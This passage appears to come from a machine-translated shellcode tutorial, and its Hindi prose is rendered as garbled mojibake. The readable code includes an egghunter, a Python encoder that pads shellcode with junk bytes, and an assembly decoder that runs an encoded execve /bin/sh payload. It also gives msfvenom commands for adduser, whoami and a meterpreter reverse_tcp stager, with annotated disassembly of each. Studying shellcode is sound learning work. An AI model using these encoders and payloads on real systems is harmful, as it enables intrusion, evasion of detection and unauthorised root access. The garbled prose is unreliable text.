	mov ebx, 0xefbeadde	; egg in reverse order<font></font>
        mov esi, esp<font></font>
        mov cl, 200		; change this value for deeper or less searching<font></font>
<font></font>
find:   lodsb			; read byte from source - esi<font></font>
        cmp eax, ebx		; is it egg?<font></font>
        jz equal		; if so, give control to shellcode<font></font>
	shl eax, 8		; if not, shift one byte left<font></font>
        loop find		; repeat<font></font>
<font></font>
	xor eax, eax		; if there is no egg - exit<font></font>
        mov al, 1<font></font>
	xor ebx, ebx<font></font>
        mov bl, 10<font></font>
        int 0x80<font></font>
<font></font>
equal: jmp esi			; jmp to shellcode</code></pre><br>
<img src="https://habrastorage.org/webt/yg/yd/gt/ygydgt0qxjwf1ev2_4e0i6puwek.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЖрдк jmp рдЦреЛрдЬ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХреЗ рд╕рд╛рде рд▓реВрдк рдлрд╝рд╛рдЗрдВрдб рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрд╕рд╕реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рддреНрд░реБрдЯрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред </font><font style="vertical-align: inherit;">рдЖрдк рдЗрд╕ рдЕрдкрд╡рд╛рдж рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реИрдВрдбрд▓рд░ рднреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рд╛рдорд╛рдиреНрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдорд╛рд░рд╛ рдХреЛрдб рдкрд░реНрдпрд╛рдкреНрдд рд╣реИред </font><font style="vertical-align: inherit;">рдХрднреА-рдХрднреА рд╕реНрдореГрддрд┐ рдХреЗ рдПрдХ рдЕрд▓рдЧ рджрд┐рд╢рд╛ рдореЗрдВ рдкрдбрд╝реЗ "рдИрд╕реНрдЯрд░ рдЕрдВрдбреЗ" рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдлрд┐рд░ рдЖрдкрдХреЛ рджрд┐рд╢рд╛ рдзреНрд╡рдЬ рдХреЗ рдореВрд▓реНрдп рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдФрд░ рдЖрдк рд╢реЗрд▓рдХреЛрдб рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЗрдПрдордкреА рдПрд╕рдЖрдИрдЖрдИ + рдСрдлрд╕реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. рдЕрдкрдирд╛ рдПрдирдХреЛрдбрд░ рд▓рд┐рдЦреЗрдВ</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд░рд┐рд╡рд░реНрд╕ рдбрд┐рдХреЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рд╢реЗрд▓рдХреЛрдб рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрд▓рдЧ рдХрд░рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдореИрдВрдиреЗ рдЗрд╕ рдХрд╛рд░реНрдп рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛, рдЬреИрд╕рд╛ рдХрд┐ рдореБрдЭреЗ рдкрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдереЛрдбрд╝реА рдЬрдЯрд┐рд▓рддрд╛ рдХреЗ рд╕рд╛рде: рд╢реЗрд▓рдХреЛрдб рдХреЗ рдЖрд╡рд╢реНрдпрдХ рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдХреВрдбрд╝реЗ рдХреЗ рдмрд╛рдЗрдЯреНрд╕ рдХреА рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ (1 рд╕реЗ 5) рд╕рдВрдЦреНрдпрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдПрдиреНрдХреЛрдбреЗрдб рд╢реЗрд▓рдХреЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВрдиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦреА рд╣реИ:</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
        print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
        sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
opcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
encoded = <span class="hljs-string">""</span><font></font>
<font></font>
b1 = bytearray.fromhex(opcode)<font></font>
<font></font>
<span class="hljs-comment"># Generates random value from 1 to 5 of 'aa' string</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b1:<font></font>
        t = <span class="hljs-string">'aa'</span> * random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)<font></font>
        encoded += <span class="hljs-string">'%02x'</span> % x + t<font></font>
<font></font>
print(encoded)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд░рд┐рдгрд╛рдо рдХреНрд░рдордмрджреНрдз рд╕рдВрдХрд▓рд┐рдд рдХрд░ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$./hex2stack.py $(./encoder.py $(hexopcode execve_sh))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдирд┐рд╖реНрдХрд░реНрд╖:</font></font><br>
<br>
<pre><code class="plaintext hljs">	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд╣рд▓реЗ рднрд╛рдЧ 0x909090aa рдкрд░ рдзреНрдпрд╛рди рджреЗрдВред </font><font style="vertical-align: inherit;">рджрд╛рдИрдВ рдУрд░ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ 90 рд╣рдорд╛рд░реЗ рдПрдиреНрдХреЛрдбреЗрдб рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдЕрдВрдд рд╣реИред </font><font style="vertical-align: inherit;">рдмреЗрд╢рдХ, рдЖрдк рд╢реЗрд▓рдХреЛрдб рдХреЗ рдЕрдВрдд рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдЕрдиреНрдп рдорд╛рдиреНрдп рдорд╛рди рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдбрд┐рдХреЛрдбрд░ рдХреЛрдб:</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	; encoded shellcode<font></font>
	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31<font></font>
<font></font>
	; prepare registers for decoding<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	mov bl, 0xaa<font></font>
<font></font>
decoder:<font></font>
	lodsb		; read byte from stack<font></font>
	cmp al, bl	; check: is it trash byte?<font></font>
	jz loopy	; if so, repeat<font></font>
	cmp al, 0x90	; is it end of shellcode?<font></font>
	jz exec		; if so, go to start of shellcode<font></font>
	stosb		; if not, place byte of shellcode into stack<font></font>
loopy:	jmp decoder	; repeat<font></font>
<font></font>
exec:	jmp esp		; give flow control to shellcode</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрджрд┐ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдПрдирдУрдкреА рдирд┐рд░реНрджреЗрд╢ (0x90) рдирд╣реАрдВ рд╣реИ, рддреЛ рдЗрд╕ рдмрд╛рдЗрдЯ рдХреЛ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдЕрдВрдд рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рд░реНрдХрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪреБрдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдЕрдиреНрдп рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЖрдкрдХреЛ рдПрдХ рдЕрд▓рдЧ рдореВрд▓реНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдкрд░рд┐рдгрд╛рдо:</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/yv/ti/4u/yvti4u7yj5dkmpbb2n7qdlzkrfq.png" alt="рдЫрд╡рд┐"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. GDB / libemu / ndisasm рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ msfvenom рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рд╢реЗрд▓рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рдЦрдВрдб рдореЗрдВ, рд╣рдо рдкреНрд░рд╕рд┐рджреНрдз рдЙрдкрдХрд░рдг - msfvenom рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рд╢реЗрд▓рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВрдЧреЗред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝реЗрдВ</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
рд╢реЗрд▓рдХреЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб:</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/adduser -f c &gt; adduser.c
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд░рд┐рдгрд╛рдореА GDB рд╢реЗрд▓рдХреЛрдб рдХреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП рдХрдИ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ, рдореИрдВрдиреЗ рдЕрдкрдиреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛ - рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рд░рдЦрдиреЗ рдФрд░ рдЗрд╕рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред</font></font><br>
<br>
<pre><code class="plaintext hljs">$ cat adduser.c | grep -Po "\\\x.." | tr -d '\n' | sed -e 's!\\x!!g' ; echo<font></font>
31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80</code></pre><br>
<pre><code class="plaintext hljs">$ python3 hex2stack.py 31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80<font></font>
out:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВрдЧреЗ:</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	push 0x6afc518b<font></font>
	push 0x590a6873<font></font>
	push 0x2f6e6962<font></font>
	push 0x2f3a2f3a<font></font>
	push 0x3a303a30<font></font>
	push 0x3a635249<font></font>
	push 0x3470346a<font></font>
	push 0x7349642f<font></font>
	push 0x7a413a74<font></font>
	push 0x696f6c70<font></font>
	push 0x73617465<font></font>
	push 0x6d000000<font></font>
	push 0x28e89380<font></font>
	push 0xcd04b541<font></font>
	push 0xe3896374<font></font>
	push 0x652f6861<font></font>
	push 0x702f2f68<font></font>
	push 0x64777373<font></font>
	push 0x6851c931<font></font>
	push 0x58056a80<font></font>
	push 0xcd58466a<font></font>
	push 0xcb89c931<font></font>
	jmp esp</code></pre><br>
<img src="https://habrastorage.org/webt/m2/ha/gd/m2hagdg75saw6og2p27eu-xa3dm.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд╣рд▓реА рдЪреАрдЬ рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдХрд░рддреА рд╣реИ, рд╡рд╣ рдкреИрд░рд╛рдореАрдЯрд░ (0,0) рдХреЗ рд╕рд╛рде рд╕реЗрдЯреНрд░реЗрдпреБрдб () рдмрдирд╛рддреА рд╣реИ: рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдПред </font><font style="vertical-align: inherit;">рдЙрд╕рдХреЗ рдмрд╛рдж рдлрд╛рдЗрд▓ / etc / passwd рдЦреБрд▓рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдХреЛрдб рдореЗрдВ, рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓рдиреЗ рдХреЗ рдмрд╛рдж, рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдЗрд╕ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рдкреНрд░реЛрд╕реЗрд╕рд░ рдЕрдЧрд▓реЗ рдХрдорд╛рдВрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рд░рдЦреЗрдЧрд╛ред </font><font style="vertical-align: inherit;">рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрд╕ рддрд░рд╣ рдХреА рдХрдорд╛рдВрдб рд╣рдорд╛рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдкрдВрдХреНрддрд┐ рд╣реИ - рдмрд╛рдж рдореЗрдВ рдпрд╣ рд▓рд╛рдЗрди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреА рдЬрд╛рдПрдЧреАред </font><font style="vertical-align: inherit;">рдпрд╣ рд╡рд┐рдзрд┐ рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. рдХрд╛рд░реНрдпрдХрд╛рд░реА Whoami рд╣рдо</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
рдлрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реЗрдЦрди рдкрддрд╛ рд▓рдЧрд╛, рдЕрдм рджреЗрдЦреЗрдВ рдХрд┐ рдЖрджреЗрд╢реЛрдВ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЪрд▓реЛред </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Shellcode рдЬрдирд░реЗрдЯ рдХрд░реЗрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/exec CMD="whoami" -f raw&gt; exec_whoami.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$sctest -vv -S -s 10000 -G shell.dot &lt; exec_whoami.bin</code></pre><br>
<pre><code class="plaintext hljs">[emu 0x0x16c8100 debug ] 6A0B                            push byte 0xb<font></font>
; execve()		<font></font>
[emu 0x0x16c8100 debug ] 58                              pop eax		<font></font>
[emu 0x0x16c8100 debug ] 99                              cwd<font></font>
; in this case - set to 0 due to cwd and small eax<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; "-c"<font></font>
[emu 0x0x16c8100 debug ] 66682D63                        push word 0x632d	<font></font>
; address of "-c"<font></font>
[emu 0x0x16c8100 debug ] 89E7                            mov edi,esp		<font></font>
; /bin/sh<font></font>
[emu 0x0x16c8100 debug ] 682F736800                      push dword 0x68732f	<font></font>
[emu 0x0x16c8100 debug ] 682F62696E                      push dword 0x6e69622f<font></font>
; 1st arg of execve()<font></font>
[emu 0x0x16c8100 debug ] 89E3                            mov ebx,esp		<font></font>
; null<font></font>
[emu 0x0x16c8100 debug ] 52                              push edx		<font></font>
; place "whoami" in stack<font></font>
[emu 0x0x16c8100 debug ] E8                              call 0x1		<font></font>
; push "-c"<font></font>
[emu 0x0x16c8100 debug ] 57                              push edi		<font></font>
; push "/bin/sh"<font></font>
[emu 0x0x16c8100 debug ] 53                              push ebx		<font></font>
; 2nd argument of execve() <font></font>
; pointer to args<font></font>
[emu 0x0x16c8100 debug ] 89E1                            mov ecx,esp		<font></font>
; execute execve()<font></font>
[emu 0x0x16c8100 debug ] CD80                            int 0x80		</code></pre><br>
<img src="https://habrastorage.org/webt/vv/s2/mx/vvs2mxrhami1dfpzknj_1s41wvo.png" alt="рдЫрд╡рд┐"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХрдорд╛рдВрдб рдХреЛ рдмрджрд▓рдирд╛ рдЖрд╕рд╛рди рдмрдирд╛рддрд╛ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП </font><b><font style="vertical-align: inherit;">рдореАрдЯрд░рдкрд░реЗрдЯрд░ рдЯреАрд╕реАрдкреА</font></b><font style="vertical-align: inherit;"> рдХрдорд╛рдВрдб рдХреЛ </font><b><font style="vertical-align: inherit;">рдЙрд▓реНрдЯрд╛ рдХрд░реЗрдВ</font></b></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 -f raw &gt; meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдлрд┐рд░</font></font><br>
<br>
<pre><code class="plaintext hljs">ndisasm -u meter_revtcp.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЛрдб</font></font><br>
<pre><code class="plaintext hljs">00000000  6A0A              push byte +0xa<font></font>
00000002  5E                pop esi			; place 10 in esi<font></font>
00000003  31DB              xor ebx,ebx			; nullify ebx<font></font>
00000005  F7E3              mul ebx<font></font>
00000007  53                push ebx			; push 0<font></font>
00000008  43                inc ebx			; 1 in ebx<font></font>
00000009  53                push ebx			; push 1<font></font>
0000000A  6A02              push byte +0x2		; push 2<font></font>
0000000C  B066              mov al,0x66			; mov socketcall<font></font>
0000000E  89E1              mov ecx,esp			; address of argument<font></font>
00000010  CD80              int 0x80			; calling socketcall() with socket()<font></font>
00000012  97                xchg eax,edi		; place sockfd in edi<font></font>
00000013  5B                pop ebx			; in ebx 1<font></font>
00000014  68C0A80066        push dword 0x6600a8c0	; place IPv4 address connect to<font></font>
00000019  680200115C        push dword 0x5c110002	; place port and proto family<font></font>
0000001E  89E1              mov ecx,esp<font></font>
00000020  6A66              push byte +0x66<font></font>
00000022  58                pop eax			; socketcall()<font></font>
00000023  50                push eax<font></font>
00000024  51                push ecx			; addresss of sockaddr_in structure<font></font>
00000025  57                push edi			; sockfd<font></font>
00000026  89E1              mov ecx,esp			; address of arguments<font></font>
00000028  43                inc ebx<font></font>
00000029  CD80              int 0x80			; call connect()<font></font>
0000002B  85C0              test eax,eax		; <font></font>
0000002D  7919              jns 0x48			; if connect successful - jmp<font></font>
0000002F  4E                dec esi			; in esi 10 - number of attempts to connect<font></font>
00000030  743D              jz 0x6f			; if zero attempts left - exit<font></font>
00000032  68A2000000        push dword 0xa2<font></font>
00000037  58                pop eax<font></font>
00000038  6A00              push byte +0x0<font></font>
0000003A  6A05              push byte +0x5<font></font>
0000003C  89E3              mov ebx,esp<font></font>
0000003E  31C9              xor ecx,ecx<font></font>
00000040  CD80              int 0x80			; wait 5 seconds<font></font>
00000042  85C0              test eax,eax<font></font>
00000044  79BD              jns 0x3<font></font>
00000046  EB27              jmp short 0x6f<font></font>
00000048  B207              mov dl,0x7			; mov dl 7 - read, write, execute for mprotect() memory area<font></font>
0000004A  B900100000        mov ecx,0x1000		; 4096 bytes<font></font>
0000004F  89E3              mov ebx,esp<font></font>
00000051  C1EB0C            shr ebx,byte 0xc<font></font>
00000054  C1E30C            shl ebx,byte 0xc		; nullify 12 lowest bits<font></font>
00000057  B07D              mov al,0x7d			; mprotect syscall<font></font>
00000059  CD80              int 0x80<font></font>
0000005B  85C0              test eax,eax<font></font>
0000005D  7810              js 0x6f			; if no success with mprotect -&gt; exit<font></font>
0000005F  5B                pop ebx			; if success put sockfd in ebx<font></font>
00000060  89E1              mov ecx,esp<font></font>
00000062  99                cdq<font></font>
00000063  B60C              mov dh,0xc<font></font>
00000065  B003              mov al,0x3			; read data from socket<font></font>
00000067  CD80              int 0x80<font></font>
00000069  85C0              test eax,eax<font></font>
0000006B  7802              js 0x6f<font></font>
0000006D  FFE1              jmp ecx			; jmp to 2nd part of shell<font></font>
0000006F  B801000000        mov eax,0x1<font></font>
00000074  BB01000000        mov ebx,0x1<font></font>
00000079  CD80              int 0x80<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣ рдХреЛрдб рдПрдХ рд╕реЙрдХреЗрдЯ рдмрдирд╛рддрд╛ рд╣реИ, рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреЛрд░реНрдЯ рдкрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЖрдИрдкреА рдкрддреЗ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рд╕реЙрдХреЗрдЯ рд╕реЗ рд╢реЗрд▓рдХреЛрдб рдХреЗ рджреВрд╕рд░реЗ рднрд╛рдЧ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рдЖрд╡рдВрдЯрд┐рдд рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдпрджрд┐ рдХрдиреЗрдХреНрд╢рди рд╡рд┐рдлрд▓ рд░рд╣рддрд╛ рд╣реИ, рддреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо 5 рд╕реЗрдХрдВрдб рдЗрдВрддрдЬрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдХрдИ рдЕрд╕рдлрд▓ рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЗ рдмрд╛рдж рдпрд╛ рдЕрдиреНрдп рдЕрдкрд╡рд╛рджреЛрдВ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдЬреЛ рдШрдЯрд┐рдд рд╣реБрдП рд╣реИрдВ, рд╡рд╣ рдЕрдкрдирд╛ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИред</font></font><br>
<br>
